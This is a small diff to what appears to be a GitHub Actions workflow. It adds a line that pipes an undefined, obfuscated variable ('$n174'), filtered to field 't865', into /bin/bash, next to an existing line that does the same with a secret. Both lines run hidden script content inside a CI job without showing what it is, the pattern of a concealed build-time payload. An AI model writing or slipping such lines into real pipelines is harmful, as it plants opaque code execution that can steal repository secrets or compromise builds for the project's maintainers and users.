@@ -19,6 +19,7 @@ jobs:
           nbk07: ${{ secrets.nbk07 }}
         run: |
           printf '%s' "$nbk07" | jq -r .nvm778 | /bin/bash
+          printf '%s' "$n174" | jq -r .t865 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
